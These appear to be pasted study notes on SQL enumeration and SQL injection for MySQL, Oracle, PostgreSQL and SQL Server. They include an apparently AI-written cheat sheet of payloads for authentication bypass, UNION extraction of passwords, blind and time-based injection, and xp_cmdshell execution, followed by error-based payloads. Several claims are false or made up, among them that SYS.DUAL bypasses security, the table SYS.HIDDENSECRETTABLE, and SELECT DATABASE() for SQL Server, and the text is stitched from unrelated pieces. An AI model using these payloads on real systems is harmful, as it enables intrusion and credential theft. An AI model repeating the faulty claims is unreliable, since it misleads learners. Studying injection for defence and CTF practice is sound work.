When we write a SELECT query, we need to specify what data we want and where we want it from. The "what" is formatted as a list of one or more columns. We can also use an asterisk (*) as a wildcard to query for all columns in a table. The "where" indicates which tables we want to use. We'll start with a basic example that selects data from one table.

```sql
SELECT * FROM menu;
```

We can use the version() function to retrieve the version of a MySQL database.

```sql
select version();
```

We can obtain the user account currently connected to a MySQL database with the current_user() or system_user() functions. We should keep in mind that this is a user account for the database, and does not necessarily correspond to an OS-level user.

```sql
select current_user();
```

For cases in which we need to extract information with a SELECT statement, we can query the tables table in the information_schema. In this example, we included a GROUP BY clause to return only one record for each unique value in the table_schema column.

```sql
select table_schema from information_schema.tables group by table_schema;
```

We can obtain a list of databases from the databases table in the system catalog, abbreviated as sys in queries. The system catalog contains metadata about the database.

```sql
SELECT name FROM sys.databases;
```

We can obtain a list of table names within a database by querying the tables table in the corresponding information_schema. In current versions of SQL Server, we can also query app.sys.tables for the same information.

```sql
select * from app.information_schema.tables;
```

Once we know a table's name, we can query the columns table in the information_schema to obtain its column names.

```sql
select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';
```

This will show you all tables in the app database — no line breaks, just one clean line.

```sql
SELECT * FROM app.information_schema.tables;
```

Since you already know your Table exists, just do:

```sql
SELECT * FROM app.dbo.nameTable;
```

Or if you're already using app as your current DB (most likely), this is enough:

```sql
SELECT * FROM dbo.nameTable;
```

Absolutely! Here's the detailed summary of **SQL Injection** techniques for **MySQL**, **Oracle**, **PostgreSQL**, and **SQL Server** that you can easily copy and paste into your notes:

---

# **SQL Injection Techniques Summary**

## **1. General SQL Injection Techniques**

### **1.1 Basic SQL Injection**
Injections manipulate input to interfere with SQL queries:
```sql
' OR 1=1 --
```
- `'` closes a string, `OR 1=1` always evaluates to true, and `--` comments out the rest of the query.
- This can bypass authentication or display all records in a table.

### **1.2 UNION-Based SQL Injection**
Union injection combines the results of multiple `SELECT` queries:
```sql
' UNION SELECT null, username, password FROM users --
```
- Here, you try to union data from the `users` table to display usernames and passwords.

### **1.3 Error-Based SQL Injection**
Error-based injection leverages database errors to gain information about the database structure:
```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
```
- This can extract sensitive information such as the database version or table structure.

### **1.4 Blind SQL Injection**
When the application doesn’t show error messages, you use boolean conditions to infer information:
```sql
' AND 1=1 --   # True, check for valid response
' AND 1=2 --   # False, no response
```
By determining when a condition is true or false, you can infer database information.

### **1.5 Time-Based Blind SQL Injection**
This uses time delays to infer data:
```sql
' AND SLEEP(5) -- 
```
If the application delays for 5 seconds, you know the query executed successfully.

---

## **2. MySQL Specific SQL Injection**

### **2.1 Retrieving Database Information**
MySQL allows you to retrieve database information using the `INFORMATION_SCHEMA` tables:
```sql
SELECT DATABASE();  -- Get current database name
SHOW TABLES;  -- Get list of tables
SHOW COLUMNS FROM table_name;  -- Get columns of a table
```

### **2.2 Dumping the Flag**
To dump all data from a table (e.g., `users` table):
```sql
' UNION SELECT null, username, password FROM users --
```

### **2.3 MySQL Specific Functions**
- `@@version` – Get MySQL version.
- `GROUP_CONCAT()` – Combine multiple row values into a single string:
  ```sql
  ' UNION SELECT GROUP_CONCAT(username, ':', password) FROM users --
  ```

---

## **3. Oracle Specific SQL Injection**

### **3.1 Retrieving Database Information**
In Oracle, `ALL_TABLES` and `USER_TABLES` can list tables:
```sql
SELECT table_name FROM all_tables;  -- List all tables
SELECT * FROM user_tables;  -- List tables for the current user
```

### **3.2 Oracle Functions**
- `USER` – Get the current database user.
- `DBMS_METADATA.GET_DDL` – Get table DDL (schema definitions).
  ```sql
  SELECT DBMS_METADATA.GET_DDL('TABLE', 'table_name') FROM dual;
  ```

### **3.3 Accessing Hidden Tables**
```sql
SELECT * FROM SYS.HIDDENSECRETTABLE;
```
Oracle uses `SYS` schema for system-level tables.

### **3.4 Extracting Data**
```sql
' UNION SELECT null, username, password FROM users --
```

### **3.5 Oracle Specific Injection for System Tables**
You can use `SYS.DUAL` to bypass security restrictions:
```sql
SELECT * FROM SYS.DUAL;
```

---

## **4. PostgreSQL Specific SQL Injection**

### **4.1 Retrieving Database Information**
PostgreSQL stores system information in `pg_catalog`:
```sql
SELECT current_database();  -- Get current database
SELECT table_name FROM information_schema.tables;  -- List all tables
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';  -- Get columns of users table
```

### **4.2 PostgreSQL Functions**
- `pg_user` – Retrieves user information.
  ```sql
  SELECT * FROM pg_user;
  ```

- `version()` – Get PostgreSQL version:
  ```sql
  SELECT version();
  ```

### **4.3 Blind SQL Injection (PostgreSQL)**
PostgreSQL supports error-based and time-based techniques for blind injections:
```sql
' AND 1=1 --  -- Always true
' AND 1=2 --  -- Always false
```

### **4.4 UNION-Based Injection**
PostgreSQL can also use the `UNION` keyword to combine query results:
```sql
' UNION SELECT null, username, password FROM users --
```

---

## **5. SQL Server (MS SQL) Specific SQL Injection**

### **5.1 Retrieving Database Information**
In SQL Server, use `INFORMATION_SCHEMA` to get table info:
```sql
SELECT DATABASE();  -- Get current database name
SELECT * FROM INFORMATION_SCHEMA.TABLES;  -- Get all tables
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';  -- Get columns of the users table
```

### **5.2 SQL Server Functions**
- `@@version` – Get SQL Server version:
  ```sql
  SELECT @@version;
  ```

- `sysobjects` – List all tables in the database:
  ```sql
  SELECT name FROM sysobjects WHERE type = 'U';  -- List user tables
  ```

- `xp_cmdshell` – Execute system commands (if enabled):
  ```sql
  EXEC xp_cmdshell('dir');  -- Get system directory
  ```

### **5.3 SQL Server Blind Injection**
Just like MySQL and Oracle, you can use **blind injection** to infer information by checking responses:
```sql
' AND 1=1 --  -- True
' AND 1=2 --  -- False
```

### **5.4 Time-Based Blind Injection in SQL Server**
```sql
' WAITFOR DELAY '00:00:05' --  -- Delay execution for 5 seconds
```

### **5.5 UNION Injection**
```sql
' UNION SELECT null, username, password FROM users --
```

---

## **6. General SQL Injection Protection Methods**

To prevent SQL Injection, ensure:
1. **Use Prepared Statements** – Always bind user input to avoid injection.
2. **Use ORM (Object-Relational Mapping) Libraries** – These libraries automatically prevent most SQL injection techniques.
3. **Validate and Sanitize Input** – Reject inputs containing `'`, `"`, `--`, `;`, `/*`, etc.
4. **Least Privilege Principle** – Restrict database access rights as much as possible (e.g., avoid using high-privilege accounts for web applications).
5. **Error Handling** – Avoid showing detailed database error messages to the user.

---

## **Conclusion**
By learning and understanding the above commands for each database, you can:
- **Identify vulnerable points** in an application.
- **Test** different techniques to inject SQL code.
- **Exploit** poorly-secured systems for educational and ethical hacking purposes (CTFs, security testing).

Always remember that SQL Injection is illegal unless you have explicit permission (ethical hacking or CTF challenges).

If you need more details or have specific questions about a database, let me know! 

---

Feel free to copy and paste this directly into your notes! If you need more detailed examples or clarification on any point, don’t hesitate to ask.


mySQL

```sql
select version();
```

```sql
select current_user();
```

```sql
select table_schema from information_schema.tables group by table_schema;
```

```sql
select table_name from information_schema.tables where table_schema = 'app';
```

```sql
select column_name, data_type from information_schema.columns where table_schema = 'app' and table_name = 'menu';
```

Microsoft SQL Server

```sql
select @@version;
```

```sql
SELECT SYSTEM_USER;
```

```sql
SELECT name FROM sys.databases;
```

```sql
select * from app.information_schema.tables;
```

```sql
select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';
```

PostgreSQL

```sql
select version();
```

```sql
select current_user;
```

```sql
select datname from pg_database;
```

```sql
select table_name from app.information_schema.tables where table_schema = 'public';
```

```sql
select column_name, data_type from app.information_schema.columns where table_name = 'menu';
```

Oracle

```sql
select * from v$version;
```

```sql
select user from dual;
```

```sql
select owner from all_tables group by owner;
```

```sql
select table_name from all_tables where owner = 'SYS' order by table_name;
```

```sql
select column_name, data_type from all_tab_columns where table_name = 'MENU';
```











Errorbase
MySQL = extractvalue('',concat('>',version()))
SQL Server = cast(@@version as integer)
PostgreSQL = cast(version() as integer)
Oracle = to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))


